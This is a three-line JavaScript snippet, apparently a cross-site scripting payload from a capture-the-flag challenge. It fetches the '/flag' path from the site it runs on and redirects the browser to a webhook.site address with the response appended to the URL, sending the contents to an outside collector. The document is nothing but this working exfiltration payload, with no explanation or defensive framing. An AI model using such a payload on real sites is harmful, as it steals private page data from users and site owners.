fetch('/flag')
  .then(response => response.text())
  .then(data => location='https://webhook.site/ffc75ac7-840b-41bd-b6c3-890343307ea0?x='+(data));
